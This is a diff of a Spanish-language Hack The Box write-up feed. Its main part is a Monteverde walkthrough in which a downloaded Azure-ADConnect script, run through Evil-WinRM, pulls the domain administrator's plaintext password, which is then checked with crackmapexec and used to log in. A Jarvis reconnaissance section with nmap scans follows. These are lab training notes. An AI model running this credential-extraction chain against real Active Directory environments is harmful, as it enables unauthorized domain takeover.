+&lt;p&gt;El usuario &lt;strong&gt;Administrator&lt;/strong&gt; es el único que pertenece al grupo &lt;strong&gt;Domain Admins&lt;/strong&gt;, por lo tanto, vamos a buscar un exploit que nos ayude a escalar privilegios dentro de &lt;strong&gt;Azure Admins&lt;/strong&gt; y encontramos un recurso en internet &lt;a href=&quot;https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1&quot;&gt;Azure-ADConnect.ps1&lt;/a&gt;, así que lo descargamo.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ wget https://raw.githubusercontent.com/Hackplayers/PsCabesha-tools/master/Privesc/Azure-ADConnect.ps1
+&lt;span class=&quot;nt&quot;&gt;--2022-01-15&lt;/span&gt; 19:28:27--  https://raw.githubusercontent.com/Hackplayers/PsCabesha-tools/master/Privesc/Azure-ADConnect.ps1
+Resolviendo raw.githubusercontent.com &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;raw.githubusercontent.com&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;... 185.199.110.133, 185.199.111.133, 185.199.108.133, ...
+Conectando con raw.githubusercontent.com &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;raw.githubusercontent.com&lt;span class=&quot;o&quot;&gt;)[&lt;/span&gt;185.199.110.133]:443... conectado.
+Petición HTTP enviada, esperando respuesta... 200 OK
+Longitud: 2264 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.2K&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;text/plain]
+Grabando a: «Azure-ADConnect.ps1»
+
+Azure-ADConnect.ps1              100%[&lt;span class=&quot;o&quot;&gt;=======================================================&amp;gt;]&lt;/span&gt;   2.21K  &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;.-KB/s    en 0s      
+
+2022-01-15 19:28:27 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;48.3 MB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - «Azure-ADConnect.ps1» guardado &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2264/2264]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora lo pasamos a la máquina víctima en un diretorio donde tengamos permisos:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&amp;gt; &lt;span class=&quot;nb&quot;&gt;mkdir &lt;/span&gt;Privesc
+
+
+    Directory: C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp
+
+
+Mode                LastWriteTime         Length Name
+&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                &lt;span class=&quot;nt&quot;&gt;-------------&lt;/span&gt;         &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
+d-----        1/15/2022   6:29 PM                Privesc
+
+
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&amp;gt; &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;Privesc
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc&amp;gt; upload Azure-ADConnect.ps1
+Info: Uploading Azure-ADConnect.ps1 to C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;zure-ADConnect.ps1
+
+                                                             
+Data: 3016 bytes of 3016 bytes copied
+
+Info: Upload successful!
+
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc&amp;gt; &lt;span class=&quot;nb&quot;&gt;dir
+
+
+    &lt;/span&gt;Directory: C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc
+
+
+Mode                LastWriteTime         Length Name
+&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                &lt;span class=&quot;nt&quot;&gt;-------------&lt;/span&gt;         &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;-a----&lt;/span&gt;        1/15/2022   6:30 PM           2264 Azure-ADConnect.ps1
+
+
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora importamos el módulo y ejecutamos la función correspondiente.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc&amp;gt; Import-Module .&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;zure-ADConnect.ps1
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc&amp;gt; Azure-ADConnect &lt;span class=&quot;nt&quot;&gt;-server&lt;/span&gt; 10.10.10.172 &lt;span class=&quot;nt&quot;&gt;-db&lt;/span&gt; ADSync
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Domain:  MEGABANK.LOCAL
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Username: administrator
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+]Password: d0m@in4dminyeah!
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Tenemos la contraseña del usuario &lt;strong&gt;Administrator&lt;/strong&gt; y como siempre, vamos a guardar las credenciales y validar con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;crackmapexec&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ crackmapexec smb 10.10.10.172 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'administrator'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'d0m@in4dminyeah!'&lt;/span&gt;
+SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10.0 Build 17763 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:MONTEVERDE&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:MEGABANK.LOCAL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;dministrator:d0m@in4dminyeah! &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Pwn3d!&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Son válidas, asi que ahora podemos conectarnos a la máquina ya como el usuario &lt;strong&gt;Administartor&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ evil-winrm &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'administrator'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'d0m@in4dminyeah!'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 10.10.10.172
+
+Evil-WinRM shell v3.3
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; &lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;megabank&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;dministrator
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya podemos visualizar la flag (root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="Windows" /><category term="Active_Directory" /><category term="Powershell" /><category term="File_Misconfiguration" /><summary type="html">Resolución de la máquina Monteverde en la plataforma de Hack The Box</summary></entry><entry><title type="html">Hack The Box Nest</title><link href="http://localhost:4000/htb-nest/" rel="alternate" type="text/html" title="Hack The Box Nest" /><published>2022-01-15T00:00:00-06:00</published><updated>2022-01-15T00:00:00-06:00</updated><id>http://localhost:4000/htb-nest</id><content type="html" xml:base="http://localhost:4000/htb-nest/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-nest/banner-nest.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;nest&quot;&gt;Nest&lt;/h2&gt;
 &lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.178.&lt;/p&gt;
@@ -6510,484 +7179,4 @@ If you captured this make sure to go here.....
 /006-final/xvf7-flag/
 
 &lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>K4miyo</name></author><category term="CMS" /><category term="Web" /><category term="POP3" /><category term="CC" /><summary type="html">Resolución de la máquina GoldenEye en la plataforma de VulnHub</summary></entry><entry><title type="html">Hack The Box Jarvis</title><link href="http://localhost:4000/htb-jarvis/" rel="alternate" type="text/html" title="Hack The Box Jarvis" /><published>2021-12-31T00:00:00-06:00</published><updated>2021-12-31T00:00:00-06:00</updated><id>http://localhost:4000/htb-jarvis</id><content type="html" xml:base="http://localhost:4000/htb-jarvis/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-jarvis/banner-jarvis.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;jarvis&quot;&gt;Jarvis&lt;/h2&gt;
-&lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.143.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.10.143
-PING 10.10.10.143 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.143&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
-64 bytes from 10.10.10.143: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;63 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;137 ms
-
-&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.10.143 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
-1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
-rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 136.756/136.756/136.756/0.000 ms
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para determinar los puertos abiertos de la máquina y exportanto la información al archivo &lt;strong&gt;allPorts&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 10.10.10.143 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
-Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-12-26 20:08 CST
-Initiating Ping Scan at 20:08
-Scanning 10.10.10.143 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;4 ports]
-Completed Ping Scan at 20:08, 0.16s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 total hosts&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Initiating SYN Stealth Scan at 20:08
-Scanning 10.10.10.143 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
-Discovered open port 22/tcp on 10.10.10.143
-Discovered open port 80/tcp on 10.10.10.143
-SYN Stealth Scan Timing: About 48.38% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 20:09 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:00:33 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Discovered open port 64999/tcp on 10.10.10.143
-Completed SYN Stealth Scan at 20:09, 56.60s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.143
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.16s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Not shown: 65532 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-PORT      STATE SERVICE
-22/tcp    open  ssh
-80/tcp    open  http
-64999/tcp open  unknown
-
-Read data files from: /usr/bin/../share/nmap
-Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;56.92 seconds
-           Raw packets sent: 67041 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.950MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 67038 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.682MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Mediante la función &lt;a href=&quot;/extractPorts&quot;&gt;extractPorts&lt;/a&gt; definida a nivel de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zsh&lt;/code&gt; , se obtiene la información más relevante de la captura grepeable.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ extractPorts allPorts
-───────┬─────────────────────────────────────
-       │ File: extractPorts.tmp
-───────┼─────────────────────────────────────
-   1   │ 
-   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
-   3   │ 
-   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.10.143
-   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 22,80,64999
-   6   │ 
-   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p22&lt;/span&gt;,80,64999 10.10.10.143 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
-Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-12-26 20:10 CST
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.143
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-
-PORT      STATE SERVICE VERSION
-22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-| ssh-hostkey: 
-|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-80/tcp    open  http    Apache httpd 2.4.25 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
-|_http-title: Stark Hotel
-| http-cookie-flags: 
-|   /: 
-|     PHPSESSID: 
-|_      httponly flag not &lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt;
-|_http-server-header: Apache/2.4.25 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-64999/tcp open  http    Apache httpd 2.4.25 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
-|_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;'t have a title (text/html).
-|_http-server-header: Apache/2.4.25 (Debian)
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 17.80 seconds
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos que se encuentran abiertos los puertos 80 y 64999 asociados al servicio HTTP, por lo que antes de ver el contenido vía web, vamos a ver a lo que nos enfrentamos con la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whatweb&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ whatweb http://10.10.10.143/
-http://10.10.10.143/ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;200 OK] Apache[2.4.25], Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[supersecurehotel@logger.htb], HTML5, HTTPServer[Debian Linux][Apache/2.4.25 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt;, IP[10.10.10.143], JQuery, Modernizr[2.6.2.min], Open-Graph-Protocol, Script, Title[Stark Hotel], UncommonHeaders[ironwaf], X-UA-Compatible[IE&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;edge]
-❯ whatweb http://10.10.10.143:64999/
-http://10.10.10.143:64999/ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;200 OK] Apache[2.4.25], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.25 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt;, IP[10.10.10.143], UncommonHeaders[ironwaf]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ahora si procedemos a ver el contenido vía web para ambos puertos:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-jarvis/jarvis-web.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-jarvis/jarvis-web1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Como por el puerto 64999 no nos muestra información que podamos analizar, vamos a empezar por el puerto 80 y tratar de ver los hipervínculos si nos lleva a algún lado haciendo &lt;em&gt;hovering&lt;/em&gt; y tenemos el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rooms-suites.php&lt;/code&gt; en donde vemos algunas habitaciones que al hacer &lt;em&gt;hovering&lt;/em&gt; vemos algo curioso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;room.php?cod=1&lt;/code&gt; en donde el número cambia de acuerdo con la habitación que seleccionemos; por lo que ya debemos estar pensando que debe existir una base de datos por detrás.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-jarvis/jarvis-web2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Si tratamos de hacer un &lt;em&gt;fuzzing&lt;/em&gt; para descubrir hasta que número hay algún resultado, nos aparecerá el banner mostrado en el puerto 64999; por lo que vamos a omitir el uso de la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wfuzz&lt;/code&gt; o similares y mejor vamos a utilizar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para tratar de descubrir nuevas rutas en el servidor web.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; http-enum &lt;span class=&quot;nt&quot;&gt;-p80&lt;/span&gt; 10.10.10.143 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; webScan
-Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-12-26 20:40 CST
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.143
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-
-PORT   STATE SERVICE
-80/tcp open  http
-| http-enum: 
-|   /phpmyadmin/: phpMyAdmin
-|   /css/: Potentially interesting directory w/ listing on &lt;span class=&quot;s1&quot;&gt;'apache/2.4.25 (debian)'&lt;/span&gt;
